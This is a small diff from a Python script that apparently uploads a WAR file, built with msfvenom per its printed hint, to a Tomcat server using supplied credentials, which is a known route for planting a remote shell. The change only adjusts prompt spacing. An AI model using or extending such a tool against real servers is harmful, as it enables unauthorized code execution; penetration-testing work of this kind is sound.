@@ -36,11 +36,11 @@ print (bcolors.ORANGE + "To generate a WAR file use the command below\nmsfvenom 
 print
 output_string = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(10))
 sess = requests.session()
-IPAddress = raw_input(bcolors.OKBLUE + "Please enter the Tomcat Server IPAddress or the Hostname ===>")
-username = raw_input("Please enter the Tomcat Username ===>")
-password = raw_input("Please enter the Tomcat Password ===>")
-directory = raw_input("Please enter the exact directory/folder where the WAR file is located ===>")
-fname = raw_input("Please enter FileName of the WAR file ===>")
+IPAddress = raw_input(bcolors.OKBLUE + "Please enter the Tomcat Server IPAddress or the Hostname ===> ")
+username = raw_input("Please enter the Tomcat Username ===> ")
+password = raw_input("Please enter the Tomcat Password ===> ")
+directory = raw_input("Please enter the exact directory/folder where the WAR file is located ===> ")
+fname = raw_input("Please enter FileName of the WAR file ===> ")
 WAR_FILE =  os.path.join(directory, fname)
 
 
